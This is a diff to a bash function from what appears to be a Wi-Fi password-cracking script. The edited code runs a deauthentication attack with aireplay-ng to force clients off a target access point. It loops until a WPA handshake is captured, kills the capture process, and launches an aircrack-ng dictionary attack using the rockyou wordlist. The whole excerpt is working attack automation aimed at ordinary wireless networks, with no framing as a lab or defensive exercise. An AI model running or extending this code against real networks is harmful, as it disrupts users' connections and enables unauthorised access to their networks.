@@ -97,12 +97,33 @@ crunch_attack () {
 
 	#FIND OUT HOW TO SEE IF HANDSHAKE WAS FOUND
 	#solution: look at aircrack output: says no handshake found
-		echo "Attempting to get WPA handshake on $APMAC..."
-        	aireplay-ng -0 10 -a $APMAC -c $CLMAC $INTERFACE
-		sleep 2
-	        aircrack-ng -w /usr/share/wordlists/rockyou.txt.gz -b $APMAC crackfiles/psk*.cap > output.txt
+	echo "Attempting to get WPA handshake on $APMAC..."
 
-		#grep output.txt!!!!!! with "handshake" use the psk file psk-01 which doesnt have handshake for testing!
+	HSHAKE="temp"
+
+	while [ -n "$HSHAKE" ]
+	do
+		aireplay-ng -0 5 -a $APMAC -c $CLMAC $INTERFACE
+	        sleep 3
+        	aircrack-ng -w wordlists/rockyou.txt -b $APMAC crackfiles/psk*.cap > output.txt &
+		sleep 1
+		TEMPPID=`ps -ef | grep "\baircrack\b" | awk '{print $2}'`
+
+		if [ -n "$TEMPPID" ]
+		then
+			kill 15 $TEMPPID
+		fi
+
+		HSHAKE=$(grep "No valid WPA handshakes found" output.txt)
+		echo $HSHAKE
+	done
+
+	TEMPPID=`ps -ef | grep "\bairodump-ng\b" | awk '{print $2}'`
+	echo $TEMPPID
+	kill 15 $TEMPPID
+
+	x-terminal-emulator -e "aircrack-ng -w wordlists/rockyou.txt -b $APMAC crackfiles/psk*.cap"
+
 }
 
 
